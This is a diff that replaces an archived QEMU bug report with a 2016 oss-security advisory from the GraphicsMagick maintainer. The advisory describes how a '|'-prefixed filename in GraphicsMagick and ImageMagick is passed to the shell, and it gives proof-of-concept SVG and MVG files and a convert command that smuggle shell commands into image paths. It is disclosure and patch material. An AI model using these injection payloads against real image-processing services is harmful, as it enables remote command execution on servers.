@@ -1,23 +1,71 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/04/27/2
-Message-ID: <143C0AFC63FC204CB0C55BB88F3A8ABBE376A3@EX01.corp.qihoo.net>
-Date: Wed, 27 Apr 2016 03:03:47 +0000
-From: 李强 <liqiang6-s@....cn>
-To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
-CC: "cve-assign@...re.org" <cve-assign@...re.org>
-Subject: CVE Request: Out-of-bands write issue found in qemu
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/29/7
+Message-ID: <alpine.GSO.2.20.1605291453540.4552@freddy.simplesystems.org>
+Date: Sun, 29 May 2016 15:03:10 -0500 (CDT)
+From: Bob Friesenhahn <bfriesen@...ple.dallas.tx.us>
+To: oss security list <oss-security@...ts.openwall.com>
+Subject: CVE Request: GraphicsMagick and ImageMagick popen() shell vulnerability via filename
 Content-Type: text/plain; charset=utf-8
 
-Hi,
+All existing releases of GraphicsMagick and ImageMagick support a file
+open syntax where if the first character of the file specification is
+a '|', then the remainder of the filename is passed to the shell for
+execution using the POSIX popen(3C) function.  File opening is handled
+by an OpenBlob() function in the source file blob.c.  Unlike the
+vulnerability described by CVE-2016-3714, this functionality is
+supported by the core file opening function rather than a delegates
+subsystem usually used to execute external programs.
 
-The qemu has an out-of-bands bug in uart_write() function.
+The funtionality can be demonstrated as follows:
 
-In uart_write() function from hw/char/cadence_uart.c, the ‘offset’ isn’t checked and after it is divided by 4 and used to index the ‘r’ array, it will cause an out-of-bands memory write. The value can be controlled by guest and can cause the qemu crash or code execution on host.
+   % rm -f hello.txt
+   % convert '|echo Hello > hello.txt;' null:
+   % ls hello.txt
+   hello.txt
 
-The patch is here:
-https://lists.nongnu.org/archive/html/qemu-devel/2016-04/msg02711.html
+The same weakness in the native SVG readers may be used to provoke
+this problem.  This example returns a valid image given a known file 
+(but an actual file is not necessary):
 
-Thanks,
+   <?xml version="1.0" standalone="no"?>
+   <!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+   "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+   <svg width="4in" height="3in" version="1.1"
+   xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
+   <desc>Illustrates how a shell command may be embedded in a SVG.
+   </desc>
+   <image x="200" y="200" width="100px" height="100px"
+   xlink:href="|echo Hello > hello.txt; cat /usr/lib/firefox/browser/icons/mozicon128.png">
+   <title>My image</title>
+   </image>
+   </svg>
 
-Li Qiang of the Cloud Security Team, Qihoo 360 Inc.
+Or in MVG:
 
+   push graphic-context
+   viewbox 0 0 640 480
+   image copy 200,200 100,100 "|echo Hello > hello.txt; cat /usr/lib/firefox/browser/icons/mozicon128.png"
+   pop graphic-context
+
+Previously supplied recommended patches for GraphicsMagick do 
+successfully block this attack vector in SVG and MVG.
+
+It is highly likely that there are many paths leading to a suitable 
+filename which may be executed outside of SVG and MVG since the 
+software is quite complex and powerful.  The examples above are not 
+meant to suggest that other avenues to the same weakness are not 
+available.
+
+The simple solution to the problem is to disable the popen support 
+(HAVE_POPEN) in GraphicsMagick's magick/blob.c as is done by the 
+attached patch.
+
+This issue was discovered by Bob Friesenhahn, of the GraphicsMagick
+project.
+
+Bob
+-- 
+Bob Friesenhahn
+bfriesen@...ple.dallas.tx.us, http://www.simplesystems.org/users/bfriesen/
+GraphicsMagick Maintainer,    http://www.GraphicsMagick.org/
+View attachment "disable-popen-filename.patch" of type "text/plain" (254 bytes)
